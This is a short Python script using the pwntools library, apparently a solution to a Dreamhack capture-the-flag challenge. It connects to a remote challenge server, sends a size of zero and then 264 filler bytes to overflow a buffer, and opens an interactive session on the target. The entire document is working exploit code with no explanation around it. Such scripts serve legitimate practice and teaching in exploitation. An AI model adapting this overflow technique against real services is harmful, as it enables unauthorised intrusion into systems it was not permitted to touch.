from pwn import *

p = remote('host3.dreamhack.games', 23619)

p.sendlineafter(b'Size: ', b'0')
p.sendafter(b'Data: ', b'a' * 264)

p.interactive()
